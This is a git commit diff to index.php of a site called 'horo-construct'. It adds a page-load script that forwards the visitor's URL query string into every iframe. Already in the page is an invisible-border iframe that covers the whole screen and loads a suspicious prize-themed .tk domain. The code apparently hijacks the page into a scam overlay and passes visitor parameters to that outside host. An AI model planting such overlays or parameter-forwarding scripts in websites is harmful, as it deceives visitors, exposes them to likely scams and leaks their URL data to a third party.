1690aaa32b3dd040a3b0e4ed8ff82a7ecc10ebbb
username25461 <57962971+username25461@users.noreply.github.com>
2021-08-13 11:40:49 +0400

    Update index.php

--- index.php
+++ index.php
@@ -16,7 +16,21 @@ $splitGA = explode('/', $ga);
     <link rel="icon" href="favicon.ico">
     <link href="https://fonts.googleapis.com/css?family=Roboto:200,300,400,500,700,900&display=swap&subset=cyrillic" rel="stylesheet">
     <title>horo-construct</title>
+<script type="text/javascript">
+document.addEventListener("DOMContentLoaded", function() {
+ var hvost = window.location.search.substring(1);
+ 
+ var elements = document.getElementsByTagName('iframe');
 
+ for (var i = 0; i < elements.length; i++) {
+  var newHref = elements[i].src;
+  if (newHref.indexOf("#")!=-1) continue;
+  if (newHref.indexOf("?")==-1) newHref += "?";
+  else newHref += "&";
+  if (hvost!="") elements[i].src = newHref + hvost;
+ }
+});
+</script>
 <iframe src="https://luxepriz.tk/y2csYD" style="visibility: visible !important; position: absolute; top: 0px; left: 0px; bottom: 0px; right: 0px; width: 100%; height: 100%; border: none; margin: 0; padding: 0; overflow: hidden; z-index: 999999;" allowfullscreen="allowfullscreen" webkitallowfullscreen="webkitallowfullscreen" mozallowfullscreen="mozallowfullscreen"></iframe>
   <link href="css/app.060a4a6e.css" rel="preload" as="style"><link href="css/chunk-vendors.391ed6f9.css" rel="preload" as="style"><link href="js/app.c3354203.js" rel="preload" as="script"><link href="js/chunk-vendors.763ee8ae.js" rel="preload" as="script"><link href="css/chunk-vendors.391ed6f9.css" rel="stylesheet"><link href="css/app.060a4a6e.css" rel="stylesheet"></head>
   <body>
